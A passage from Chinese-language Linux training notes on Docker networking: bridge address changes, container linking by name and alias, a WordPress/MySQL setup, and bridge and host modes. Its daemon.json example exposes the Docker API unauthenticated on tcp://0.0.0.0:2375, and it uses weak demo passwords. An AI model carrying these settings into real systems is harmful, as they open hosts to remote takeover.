    inet 10.0.0.77/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:a6:33:20:10 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:a6ff:fe33:2010/64 scope link 
       valid_lft forever preferred_lft foreve
       
       
       
[root@centos7 ~]# yum -y install bridge-utils
[root@centos7 ~]# brctl addbr br0
[root@centos7 ~]# brctl show
bridge name	   bridge id		   STP enabled	  interfaces
br0		      8000.000000000000	   no		
docker0		  8000.0242a6332010	   no
[root@centos7 ~]# ip a a 192.168.100.1/24 dev br0




#修改默认网络设置
[root@centos7 ~]# vim /lib/systemd/system/docker.service
# for containers run by docker
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock -b br0
#修改docker0的地址
# for containers run by docker
ExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock --bip 192.168.1.1/24
[root@centos7 ~]# systemctl daemon-reload
[root@centos7 ~]# systemctl restart docker




#查看地址修改是否成功
[root@centos7 ~]# docker run -it --rm alpine:3.11 sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
23: eth0@if24: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:c0:a8:64:02 brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.2/24 brd 192.168.100.255 scope global eth0   #地址修改成功！！！
       valid_lft forever preferred_lft forever
/ # exit




#查看修改docker0的地址是否成功
[root@centos7 ~]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:90:b9:33 brd ff:ff:ff:ff:ff:ff
    inet 10.0.0.77/24 brd 10.0.0.255 scope global noprefixroute eth0
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:a6:33:20:10 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.1/24 brd 192.168.1.255 scope global docker0    #docker0地址修改成功！！
       valid_lft forever preferred_lft forever
    inet6 fe80::42:a6ff:fe33:2010/64 scope link 
       valid_lft forever preferred_lft forever
22: br0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default qlen 1000
    link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.1/24 scope global br0
       valid_lft forever preferred_lft forever
    inet6 fe80::bc4b:40ff:fef1:1684/64 scope link 
       valid_lft forever preferred_lft forever
```

#### 48.8.2 容器名称互联

```
新建容器时，docker会自动分配容器名称，容器ID和IP地址，导致容器名称，容器ID和IP都不固定，那么如何区分不同的容器，实现和确定目标容器的通信呢？解决方案是给容器起个固定的名称，容器之间通过固定名称实现确定目标的通信。

有两种固定名称: 
1）容器名称
2）容器名称的别名
注意: 两种方式都最少需要两个容器才能实现
```

##### 48.8.2.1 通过容器名称互联

###### 48.8.2.1.1 容器名称介绍

```
即在同一个宿主机上的容器之间可以通过自定义的容器名称相互访问，比如: 一个业务前端静态页面是使用nginx，动态页面使用的是tomcat，另外还需要负载均衡调度器，如: haproxy对请求调度至nginx和tomcat的容器，由于容器在启动的时候其内部IP地址是DHCP 随机分配的，而给容器起个固定的名称，则是相对比较固定的，因此比较适用于此场景。

注意: 如果被引用的容器地址变化,必须重启当前容器才能生效。
```

###### 48.8.2.1.2 容器名称实现

**docker run 创建容器，可使用--link选项实现容器名称的引用**

```
--link list                     			   #Add link to another container
格式:  
docker run --name <容器名称>        			#先创建指定名称的容器
docker run --link <目标通信的容器ID或容器名称>     #再创建容器时引用上面容器的名称
```

###### 48.8.2.1.3 使用容器名称进行容器间通信

1. **先创建第一个指定容器名称的容器**

```
[root@ubuntu1804 ~]#docker run -it --name server1 --rm alpine:3.11 sh
/ # cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2 cdb5173003f5
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
150: eth0@if151: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
          valid_lft forever preferred_lft forever
/ # ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.038 ms
^C
--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.038/0.038/0.038 ms
/ # ping server1
ping: bad address 'server1'
/ # ping cdb5173003f5
PING cdb5173003f5 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.040 ms
64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.128 ms
^C
--- cdb5173003f5 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.040/0.084/0.128 ms
```

2. **新建第二个容器时引用第一个容器的名称**


```
#会自动将第一个主机的名称加入/etc/hosts文件,从而可以利用第一个容器名称进行访问
[root@ubuntu1804 ~]#docker run -it --rm --name server2 --link server1 alpine:3.11 sh
/ # cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2 server1 cdb5173003f5
172.17.0.3 7ca466320980
/ # ping server1
PING server1 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.111 ms
^C
--- server1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.111/0.111/0.111 ms
/ # ping server2
ping: bad address 'server2'
/ # ping 7ca466320980
PING 7ca466320980 (172.17.0.3): 56 data bytes
64 bytes from 172.17.0.3: seq=0 ttl=64 time=0.116 ms
64 bytes from 172.17.0.3: seq=1 ttl=64 time=0.069 ms
^C
--- 7ca466320980 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.069/0.092/0.116 ms
/ # ping cdb5173003f5  
PING cdb5173003f5 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.072 ms
64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.184 ms
^C
--- cdb5173003f5 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.072/0.128/0.184 ms



[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND             CREATED         
    STATUS             PORTS               NAMES
7ca466320980       alpine:3.11         "sh"                24 seconds ago   
  Up 23 seconds                           server2
cdb5173003f5       alpine:3.11         "sh"                7 minutes ago   
    Up 7 minutes
```

###### 48.8.2.1.4 实现wordpress和MySQL两个容器互连

```
[root@centos7 ~]# tree wordpress/
wordpress/
├── env_mysql.list
├── env_wordpress.list
└── mysql
    └── mysql_test.cnf

1 directory, 3 files



[root@centos7 ~]# mkdir wordpress
[root@centos7 ~]# cd wordpress/
[root@centos7 ~]#cat wordpress/env_mysql.list 
MYSQL_ROOT_PASSWORD=123456
MYSQL_DATABASE=wordpress
MYSQL_USER=wpuser
MYSQL_PASSWORD=wppass
[root@centos7 ~]#cat wordpress/env_wordpress.list
WORDPRESS_DB_HOST=mysql:3306
WORDPRESS_DB_NAME=wordpress
WORDPRESS_DB_USER=wpuser
WORDPRESS_DB_PASSWORD=wppass
WORDPRESS_TABLE_PREFIX=wp_

[root@centos7 ~]#cat wordpress/mysql/mysql_test.cnf 
[mysqld]
server-id=100
log-bin=mysql-bin


[root@centos7 ~]# docker run --name mysql -v /root/wordpress/mysql/:/etc/mysql/conf.d -v /data/mysql:/var/lib/mysql --env-file=/root/wordpress/env_mysql.list -d -p 3306:3306 mysql:5.7.30



#查看数据库是否有wordpresss
[root@centos7 ~]# mysql -uroot -p123456 -h 127.0.0.1
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.30-log MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.01 sec)



[root@centos7 ~]# docker run -d --name wordpress --link mysql --env-file=/root/wordpress/env_wordpress.list -p 80:80 wordpress



```

![1660120258921](linux体系.assets/1660120258921.png)

##### 48.8.2.2 通过自定义容器别名互联

```
自定义的容器名称可能后期会发生变化，那么一旦名称发生变化，容器内程序之间也必须要随之发生变化，比如:程序通过固定的容器名称进行服务调用，但是容器名称发生变化之后再使用之前的名称肯定是无法成功调用，每次都进行更改的话又比较麻烦，因此可以使用自定义别名的方式解决，即容器名称可以随意更改，只要不更改别名即可。
```

###### 48.8.2.2.1 容器别名实现

**命令格式:** 

```
docker run --name <容器名称> 							   #先创建指定名称的容器
docker run -d --name 容器名称 --link <目标容器名称>:<容器别名> #给上面创建的容器起别名,来创建新容器
```

###### 48.8.2.2.2 实战案例: 使用容器别名

**范例: 创建第三个容器，引用前面创建的容器，并起别名**

```
[root@ubuntu1804 ~]# docker run -it --name server1 --rm alpine:3.11 sh
[root@ubuntu1804 ~]# docker run -it --name server2 --rm alpine:3.11 sh
[root@ubuntu1804 ~]#docker run -it --rm --name server3 --link server1:server1-alias alpine:3.11 sh
/ # cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2 server1-alias cdb5173003f5 server1
172.17.0.4 d9622c6831f7
/ # ping server1
PING server1 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.101 ms
^C
--- server1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.101/0.101/0.101 ms
/ # ping server1-alias
PING server1-alias (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.073 ms
^C
--- server1-alias ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.073/0.073/0.073 ms
```

**范例: 创建第四个容器，引用前面创建的容器，并起多个别名**

```
[root@ubuntu1804 ~]#docker run -it --rm --name server4 --link server1:"server1-alias1 server1-alias2" alpine:3.11 sh
/ # cat /etc/hosts
127.0.0.1 localhost
::1 localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2 server1-alias1 server1-alias2 cdb5173003f5 server1
172.17.0.5 db3d2f084c05
/ # ping server1
PING server1 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.107 ms
^C
--- server1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.107/0.107/0.107 ms
/ # ping server1-alias1
PING server1-alias1 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.126 ms
^C
--- server1-alias1 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.126/0.126/0.126 ms
/ # ping server1-alias2
PING server1-alias2 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.124 ms
^C
--- server1-alias2 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.124/0.124/0.124 ms
```

#### 48.8.3 Docker网络连接模式

##### 48.8.3.1 网络模式介绍

![1660121636246](linux体系.assets/1660121636246.png)

**Docker的网络支持5种网络模式:** 

```
1）none			#什么网络设备都没有，只有回环网卡
2）bridge 	     #容器默认设置
3）host：         #容器采用的网络设置和宿主机一模一样
4）container：	#一个容器共享另一个容器的网络
5）network-name   #基于上面四种模式的变种
```

**范例: 查看默认的网络模式**

```
[root@centos7 ~]# docker network ls
NETWORK ID          NAME                DRIVER              SCOPE
d3baf5ef5c84        bridge              bridge              local
2e48abfaa49e        host                host                local
9c6f4b12c089        none                null                local
```

##### 48.8.3.2  网络模式指定

默认新建的容器使用Bridge模式，创建容器时，docker run 命令使用以下选项指定网络模式

**格式：**

```
docker run --network <mode>
docker run --net=<mode>


<mode>: 可是以下值
none
bridge
host
container:<容器名或容器ID>
<自定义网络名称>
```

##### 48.8.3.3 bridge模式

###### 48.8.3.3.1 bridge网络模式架构

![1660123050942](linux体系.assets/1660123050942.png)

```
本模式是docker的默认模式，即不指定任何模式就是bridge模式，也是使用比较多的模式，此模式创建的容器会为每一个容器分配自己的网络IP等信息，并将容器连接到一个虚拟网桥与外界通信。
```

![1660123203925](linux体系.assets/1660123203925.png)

```
可以和外部网络之间进行通信，通过SNAT访问外网，使用DNAT可以让容器被外部主机访问，所以此模式也称为NAT模式。
此模式宿主机需要启动ip_forward功能


bridge网络模式特点：
1）网络资源隔离: 不同宿主机的容器无法直接通信，各自使用独立网络。
2）无需手动配置: 容器默认自动获取172.17.0.0/16的IP地址，此地址可以修改。
3）可访问外网: 利用宿主机的物理网卡，SNAT连接外网。
4）外部主机无法直接访问容器: 可以通过配置DNAT接受外网的访问。
5）低性能较低: 因为可通过NAT，网络转换带来更的损耗。
6）端口管理繁琐: 每个容器必须手动指定唯一的端口，容器产生端口冲容。
```

###### 48.8.3.3.2 bridge模式的默认设置

**范例: 查看bridge模式信息**

```
[root@centos7 ~]# docker network inspect bridge
[
    {
        "Name": "bridge",
        "Id": "d3baf5ef5c84bbaecee25627bbbb639f98b031a6a75e4a19060297c6c1f0295c",
        "Created": "2022-08-01T09:21:23.329731073+08:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": null,
            "Config": [
                {
                    "Subnet": "172.17.0.0/16",
                    "Gateway": "172.17.0.1"
                }
            ]
        },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
        },
        "ConfigOnly": false,
        "Containers": {
            "2d8d024956fbed5100902e7dae1d78bf0a9b302a954b07dd61cab935d1199e0c": {
                "Name": "mysql",
                "EndpointID": "865f19c12d85e3b9824bfa70bf4f7c2f535c0f3201ae82f8cdb6a9c64a95a00a",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16",
                "IPv6Address": ""
            },
            "c97194c4520b48e5023d9a5554e54c31e9ec554c53dab435b23a06eab9178dc4": {
                "Name": "wordpress",
                "EndpointID": "61a8546943c2467e260fdf5f9c5b6a1460ce709ae5f45370661e4a80361a0ad9",
                "MacAddress": "02:42:ac:11:00:03",
                "IPv4Address": "172.17.0.3/16",
                "IPv6Address": ""
            }
        },
        "Options": {
            "com.docker.network.bridge.default_bridge": "true",
            "com.docker.network.bridge.enable_icc": "true",
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
        },
        "Labels": {}
    }
]
```

**范例: 宿主机的网络状态**

```
#安装docker后.默认启用ip_forward
[root@ubuntu1804 ~]#cat /proc/sys/net/ipv4/ip_forward
1
[root@ubuntu1804 ~]#iptables -vnL -t nat
Chain PREROUTING (policy ACCEPT 245 packets, 29850 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
   11   636 DOCKER     all  -- *     *       0.0.0.0/0            0.0.0.0/0   
        ADDRTYPE match dst-type LOCAL
Chain INPUT (policy ACCEPT 103 packets, 20705 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
Chain OUTPUT (policy ACCEPT 144 packets, 10324 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
    0     0 DOCKER     all  -- *     *       0.0.0.0/0           !127.0.0.0/8 
        ADDRTYPE match dst-type LOCAL
Chain POSTROUTING (policy ACCEPT 158 packets, 11500 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
  125  7831 MASQUERADE all  -- *     !docker0  172.17.0.0/16        0.0.0.0/0 
          
Chain DOCKER (2 references)
 pkts bytes target     prot opt in     out     source               destination 
        
    2   168 RETURN     all  -- docker0 *       0.0.0.0/0            0.0.0.0/0
```

**范例: 通过宿主机的物理网卡利用SNAT访问外部网络**

```
#在另一台主机上建立httpd服务器
[root@centos7 ~]#systemctl is-active httpd
active


#启动容器，默认是bridge网络模式
[root@ubuntu1804 ~]#docker run -it --rm alpine:3.11 sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
          valid_lft forever preferred_lft forever
166: eth0@if167: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
       
       
#可能访问其它宿主机
/ # ping 10.0.0.7
PING 10.0.0.7 (10.0.0.7): 56 data bytes
64 bytes from 10.0.0.7: seq=0 ttl=63 time=0.764 ms
64 bytes from 10.0.0.7: seq=1 ttl=63 time=1.147 ms
^C
--- 10.0.0.7 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 0.764/0.955/1.147 ms

/ # ping www.baidu.com
PING www.baidu.com (61.135.169.125): 56 data bytes
64 bytes from 61.135.169.125: seq=0 ttl=127 time=5.182 ms
^C
--- www.baidu.com ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 5.182/5.182/5.182 ms
/ # traceroute 10.0.0.7
traceroute to 10.0.0.7 (10.0.0.7), 30 hops max, 46 byte packets
1  172.17.0.1 (172.17.0.1)  0.008 ms  0.008 ms  0.007 ms
2  10.0.0.7 (10.0.0.7)  0.255 ms  0.510 ms  0.798 ms
/ # wget -qO - 10.0.0.7
Website on 10.0.0.7
/ # route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0



[root@centos7 ~]#curl 127.0.0.1
Website on 10.0.0.7
[root@centos7 ~]#tail /var/log/httpd/access_log 
127.0.0.1 - - [01/Feb/2020:19:31:16 +0800] "GET / HTTP/1.1" 200 20 "-"
"curl/7.29.0"
10.0.0.100 - - [01/Feb/2020:19:31:21 +0800] "GET / HTTP/1.1" 200 20 "-" "Wget"
```

###### 48.8.3.3.3 修改默认的bridge模式网络配置

**范例: 修改bridge模式默认的网段方法1**

```
[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
 link/ether 00:0c:29:6b:54:d3 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.100/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe6b:54d3/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:e0:ef:72:05 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:e0ff:feef:7205/64 scope link 
       valid_lft forever preferred_lft forever
       
       
       
[root@ubuntu1804 ~]#docker run -it --rm alpine sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ #exit


#修改桥接地址
[root@ubuntu1804 ~]#vim /lib/systemd/system/docker.service
ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock --bip=10.100.0.1/24 
[root@ubuntu1804 ~]#systemctl daemon-reload
[root@ubuntu1804 ~]#systemctl restart docker
[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:6b:54:d3 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.101/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe6b:54d3/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:e0:ef:72:05 brd ff:ff:ff:ff:ff:ff
   inet 10.100.0.1/24 brd 10.100.0.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:e0ff:feef:7205/64 scope link 
       valid_lft forever preferred_lft forever
       
       
       
[root@ubuntu1804 ~]#docker run -it --rm alpine sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
179: eth0@if180: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:0a:64:00:02 brd ff:ff:ff:ff:ff:ff
   inet 10.100.0.2/24 brd 10.100.0.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # exit



[root@ubuntu1804 ~]#docker network inspect bridge
[
   {
        "Name": "bridge",
        "Id": 
"ace11446c233d1fef534d9c734bf3ab5524afdbe76934a1a0e64803d03d54f98",
        "Created": "2020-02-02T13:23:58.037630754+08:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": null,
            "Config": [
               {
                    "Subnet": "10.100.0.0/24",
                    "Gateway": "10.100.0.1"
               }
           ]
       },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
       },
        "ConfigOnly": false,
        "Containers": {},
        "Options": {
            "com.docker.network.bridge.default_bridge": "true",
            "com.docker.network.bridge.enable_icc": "true",
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
       },
        "Labels": {}
   }
]
```

**范例: 修改bridge网络配置方法2**

```
[root@ubuntu1804 ~]#vim /etc/docker/daemon.json
{
  "hosts": ["tcp://0.0.0.0:2375", "fd://"],
  "bip": "192.168.100.100/24",           #分配docker0网卡的IP,24是容器IP的netmask
  "fixed-cidr": "192.168.100.128/26",    #分配容器IP范围,26不是容器IP的子网掩码,只表示地址范围
  "fixed-cidr-v6": "2001:db8::/64",
  "mtu": 1500,
  "default-gateway": "192.168.100.200",  #网关必须和bip在同一个网段
  "default-gateway-v6": "2001:db8:abcd::89",
  "dns": [ "1.1.1.1", "8.8.8.8"] 
  }
  
  
[root@ubuntu1804 ~]#systemctl restart docker 
[root@ubuntu1804 ~]#ip a show docker0
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP 
group default 
   link/ether 02:42:23:be:97:75 brd ff:ff:ff:ff:ff:ff
   inet 192.168.100.100/24 brd 192.168.100.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:23ff:febe:9775/64 scope link 
       valid_lft forever preferred_lft forever
       
       
       
[root@ubuntu1804 ~]#docker run -it --name b1 busybox
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
36: eth0@if37: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
   link/ether 02:42:c0:a8:64:80 brd ff:ff:ff:ff:ff:ff
   inet 192.168.100.128/24 brd 192.168.100.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # cat /etc/resolv.conf 
search magedu.com magedu.org
nameserver 1.1.1.1
nameserver 8.8.8.8
/ # route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         192.168.100.200 0.0.0.0         UG    0      0        0 eth0
192.168.100.0   0.0.0.0         255.255.255.0   U     0      0        0 eth0



[root@ubuntu1804 ~]#docker network inspect bridge
[
   {
        "Name": "bridge",
        "Id": 
"381bc2df514b0901e2a7570708aa93a3af05f298f27d4d077b52a8b324fad66c",
        "Created": "2020-07-27T21:58:31.419420569+08:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": null,
            "Config": [
               {
                    "Subnet": "192.168.100.0/24",
                    "IPRange": "192.168.100.128/26",
                    "Gateway": "192.168.100.100",
                     "AuxiliaryAddresses": {
                        "DefaultGatewayIPv4": "192.168.100.200"
                   }
               },
               {
                    "Subnet": "2001:db8::/64",
                    "AuxiliaryAddresses": {
                        "DefaultGatewayIPv6": "2001:db8:abcd::89"
                   }
               }
           ]
       },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
       },
        "ConfigOnly": false,
        "Containers": {
            "2f16c9f5efc1eefe766f6ae6ba7fcfa3434e8f4876ecdcf48c3343acd9e45b2d": 
{
                "Name": "b1",
                "EndpointID": 
"0a0fdf3d786310dca53e04f0734b9f0eeaa79aac147c7a3c69ac8d04444570f3",
                "MacAddress": "02:42:c0:a8:64:80",
                "IPv4Address": "192.168.100.128/24",
                "IPv6Address": ""
           }
       },
        "Options": {
            "com.docker.network.bridge.default_bridge": "true",
            "com.docker.network.bridge.enable_icc": "true",
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
       },
        "Labels": {}
   }
]
```

##### 48.8.3.4 Host模式

![1660133725655](linux体系.assets/1660133725655.png)

```
如果指定host模式启动的容器，那么新创建的容器不会创建自己的虚拟网卡，而是直接使用宿主机的网卡和IP地址，因此在容器里面查看到的IP信息就是宿主机的信息，访问容器的时候直接使用宿主机IP+容器端口即可，不过容器内除网络以外的其它资源，如: 文件系统、系统进程等仍然和宿主机保持隔离。

此模式由于直接使用宿主机的网络无需转换，网络性能最高，但是各容器内使用的端口不能相同，适用于运行容器端口比较固定的业务。
```

###### 48.8.3.4.1 Host网络模式特点

```
1）使用参数 --network host指定
2）共享宿主机网络
3）网络性能无损耗
4）网络故障排除相对简单
5）各容器网络无隔离
6）网络资源无法分别统计
7）端口管理困难: 容易产生端口冲突
8）不支持端口映射
```

**范例:** 

```
#打开容器前确认宿主机的80/tcp端口没有打开
[root@ubuntu1804 ~]#ss -ntl|grep :80


#创建host模式的容器
[root@ubuntu1804 ~]#docker run -d --network host --name web1 nginx-centos7-base:1.6.1
41fb5b8e41db26e63579a424df643d1f02e272dc75e76c11f4e313a443187ed1


#创建容器后，宿主机的80/tcp端口打开
